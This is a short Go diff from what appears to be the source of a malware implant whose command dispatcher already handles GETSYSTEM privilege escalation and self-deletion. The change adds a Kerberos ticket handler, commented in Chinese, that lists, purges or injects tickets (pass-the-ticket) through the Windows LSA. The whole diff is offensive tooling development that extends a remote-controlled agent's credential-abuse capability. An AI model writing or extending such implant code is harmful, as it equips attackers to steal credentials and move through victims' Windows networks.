@@ -5,8 +5,8 @@ import (
 	"fmt"
 	"implant/core/commands"
 	"implant/core/communication"
-	"implant/core/debuglog"
 	"implant/core/config"
+	"implant/core/debuglog"
 	"implant/core/services"
 	"os"
 	"sync"
@@ -333,6 +333,11 @@ func HandleCommand(data []byte) {
 		// 提权（阶段三）：只派生新会话，不改当前令牌模拟状态
 		debuglog.Printf("⬆️ [提权] 收到GETSYSTEM命令 [%d]\n", services.GETSYSTEM)
 		result, err = commands.CmdGetSystem(cmdBuf)
+		callbackType = 0
+	case services.KERB_ACTION:
+		// Kerberos 票据动作（list/purge/ptt）：Windows LSA
+		debuglog.Printf("🎫 [Kerberos] 收到票据动作命令 [%d]\n", services.KERB_ACTION)
+		result, err = services.CmdKerberosAction(cmdBuf)
 		callbackType = 0
 	case services.SELFDELETE:
 		debuglog.Printf("🗑️ [工具箱] 自删除 [%d]\n", services.SELFDELETE)
